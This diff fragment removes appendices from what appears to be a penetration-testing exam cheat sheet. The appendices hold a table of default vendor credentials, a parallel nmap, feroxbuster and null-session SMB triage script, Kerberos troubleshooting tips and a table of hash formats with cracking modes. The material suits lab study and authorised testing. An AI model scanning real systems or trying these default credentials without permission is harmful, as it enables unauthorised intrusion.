-| GLPI | glpi | glpi |
-| RouterOS | admin | (blank) |
-| Cisco | cisco | cisco |
-| MSSQL | sa | (blank), sa, password |
-| MySQL | root | (blank), root |
-| PostgreSQL | postgres | postgres, (blank) |
-| Oracle | system, sys, scott | manager, change_on_install, tiger |
-| MongoDB | (none) | (none) – check no-auth |
-| Redis | (none) | (none) – check no-auth |
-| Memcached | (none) | (none) |
-| RabbitMQ mgmt | guest | guest |
-| Splunk | admin | changeme |
-| Grafana | admin | admin |
-| FTP anon | anonymous | anonymous, (any email) |
-| HP iLO | Administrator | (random — printed on tag) |
-| ActiveMQ | admin | admin |
-
----
-
----
-
-## Appendix B — One-liner Triage (run first, all parallel)
-
-```bash
-TARGET=10.10.10.10
-mkdir -p $TARGET && cd $TARGET
-
-# Full TCP + UDP top + scripts in parallel
-sudo nmap -p- --min-rate 10000 -Pn -n -oA tcp $TARGET &
-sudo nmap -sU --top-ports 100 -Pn -oA udp $TARGET &
-wait
-
-# Service scripts on found ports
-PORTS=$(grep -oP '\d+/open' tcp.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
-sudo nmap -sV -sC -p$PORTS -Pn -oA services $TARGET
-
-# If web ports open
-for p in 80 443 8080 8443; do
-  grep -q "^$p/open" tcp.gnmap && {
-    whatweb -a3 http://$TARGET:$p &
-    feroxbuster -u http://$TARGET:$p -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -d 2 -o ferox-$p.txt &
-  }
-done
-wait
-
-# If 445 open
-grep -q "^445/open" tcp.gnmap && {
-  nxc smb $TARGET -u '' -p ''
-  enum4linux-ng -A $TARGET > enum4linux.txt
-}
-```
-
----
-
----
-
-## Appendix C — Krb5 / Kerberos quick-fix
-
-When you get `KRB_AP_ERR_SKEW`:
-```bash
-sudo ntpdate <dc-ip>
-# or
-sudo timedatectl set-ntp false
-sudo date -s "$(curl -sI http://<dc-ip>/ | grep -i '^date:' | sed 's/^date: //I')"
-```
-When `KDC_ERR_S_PRINCIPAL_UNKNOWN`:
-- You used an IP instead of an FQDN — re-run with `<host>.<dom>` (case-sensitive).
-- Add `<dc-ip>  <dc-host>.<dom>  <dom>` to `/etc/hosts`.
-When `KRB5CCNAME` ignored:
-- Some tools want absolute path; use `export KRB5CCNAME=$(pwd)/foo.ccache`.
-
----
-
----
-
-## Appendix D — Hash format quick-recognition
-
-```
-$1$...$              md5crypt (mode 500)
-$2[abxy]$...$        bcrypt (3200)
-$5$...$              sha256crypt (7400)
-$6$...$              sha512crypt (1800)
-$y$...$              yescrypt (newer Linux shadow)
-$argon2[id]$...$     argon2 (off-target for exam, mode 26500)
-^[0-9a-f]{32}$       MD5/NTLM/LM (need context)
-^[0-9a-f]{40}$       SHA1
-^[0-9a-f]{64}$       SHA256
-^aad3b435...:[0-9a-f]{32}$    LM:NT pair
-$krb5tgs$23$         Kerberoast RC4 (13100)
-$krb5tgs$17$/$18$    Kerberoast AES128/256 (19600/19700)
-$krb5asrep$23$       AS-REP roast (18200)
-$NETNTLMv2$ ::: ::: ::: ::: ::: ::    NetNTLMv2 (5600)
-```
-
----
 
 ---
 
